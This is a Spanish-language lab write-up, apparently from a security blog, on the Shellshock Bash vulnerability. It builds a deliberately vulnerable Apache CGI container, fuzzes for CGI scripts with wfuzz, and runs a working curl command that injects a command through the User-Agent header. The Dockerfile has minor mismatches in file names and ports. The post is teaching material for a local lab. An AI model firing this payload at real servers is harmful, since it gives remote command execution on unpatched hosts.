---
title: Laboratorio - ShellShock
author: cotes
date: 2023-06-25 17:51:00 +0800
categories: [Laboratorio, 'ShellShock']
tags: ['ShellShock', OWASP]
math: true
mermaid: true
image:
  path: /assets/images/Laboratorios/shellshock/logo.png
  lqip: data:image/webp;base64,UklGRpoAAABXRUJQVlA4WAoAAAAQAAAADwAABwAAQUxQSDIAAAARL0AmbZurmr57yyIiqE8oiG0bejIYEQTgqiDA9vqnsUSI6H+oAERp2HZ65qP/VIAWAFZQOCBCAAAA8AEAnQEqEAAIAAVAfCWkAALp8sF8rgRgAP7o9FDvMCkMde9PK7euH5M1m6VWoDXf2FkP3BqV0ZYbO6NA/VFIAAAA
  alt: Open Redirect Logo
---

Esta vulnerabilidad afecta a bash antiguas y se aprovecha del funcionamiento de CGI. CGI permite ejecutar scripts externos, usualmente escritos en bash, cmd, perl y cgi, permitiendo a un atacante ejecutar comandos modificando la cabecera User-Agent en una petición enviada al servidor

* **Laboratorio** 🔬

1. Crearemos un archivo **Dockerfile** con el siguiente contenido

```dockerfile
# Base image
FROM ubuntu:12.04.5
# Actualizar paquetes y herramientas
RUN apt-get update && apt-get upgrade -y
# Instalar Apache y configurarlo para ejecutar CGI
RUN apt-get install -y apache2 && \
    a2enmod cgi
# Crear un archivo CGI vulnerable a Shellshock
RUN echo '#!/bin/bash\necho "Content-type: text/html"\necho\necho "<html><body><h2>Shellshock Vulnerable CGI</h2><pre>"\necho\necho "Vulnerable to Shellshock"\necho\necho "</pre></body></html>"' > /usr/lib/cgi-bin/shellshock.cgi && \
    chmod +x /usr/lib/cgi-bin/new.cgi
# Exponer el puerto 80
EXPOSE 80
# Iniciar el servidor Apache al ejecutar el contenedor
CMD ["apache2ctl", "-D", "FOREGROUND"]
```

a. Creamos un imagen **docker build -t <Nombre Imagen> .**

b. Desplegamos el contenedor **docker run -d -p 80:80 <Nombre Imagen>**

* Veremos que ya tenemos un servicio **Apache** ejecutandose en nuestra máquina host en el puerto 8080

![](/assets/images/Laboratorios/shellshock/apache.png)


2. El directorio que aloja los **scripts que se van a ejecutar** es **`/cgi-bin/`**, si accedemos a el veremos un código de estado **`403 Forbidden`**, esto nos indica que el **directorio existe** pero no tenemos capacidad de listar su contenido, sin embargo, si conocemos el nombre de un script podemos acceder y ejecutarlo.

3. Como no conocemos el nombre de un script, lo que haremos es **fuzzear** por nombres y posibles extensiones (Esto solo por practicar, ya que en el archivo **Dockerfile** está el nombre del **script**)

```bash
wfuzz -c -t 100 --hc=404 -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -z list,cgi-sh-pl http://localhost/cgi-bi
n/FUZZ.FUZ2Z

000000055:   500        16 L     77 W       607 Ch      "new - cgi"
```
> Encontramos un **script** con nombre **`new.cgi`**

* **-c:** Formato Colorizado. 🎨
* **-t <N>:** N Hilos a usar. 🧵
* **--hc=4040:** Oculatamos las respuestas con código de estado **404 Not Found**. ❌
* **-w <Diccionario>:** Indicamos un diccionario para que fuzee.
* **-z list,cgi-sh-pl:** Indicamos las extensiones por las cuales fuzeará.
* **http://localhost:8080/cgi-bin/FUZZ.FUZ2Z**: FUZZ -> Nombres del diccionario, FUZ2Z -> Cada extensión indicada.


4. Ahora ya podemos llevar a cabo el ataque **Shellshock**, sacamos el **payload** de este [post](https://blog.cloudflare.com/inside-shellshock/), usaremos **cURL**

* **Comando:** `curl -s -X GET "http://localhost/cgi-bin/new.cgi" -H "User-Agent:  () { :; }; echo;  /usr/bin/whoami"`

![](/assets/images/Laboratorios/shellshock/whoami.png)

* **Recomendaciones**
  + [x] Esta vulnerabilidad se da únicamente en versiones muy antiguas de bash.
  + [x] Si no vemos el output del comando, debemos añadir uno o dos **echo;**.
  + [x] Si queremos ejecutar cualquier comando es recomendable hacerlo con su ruta absoluta.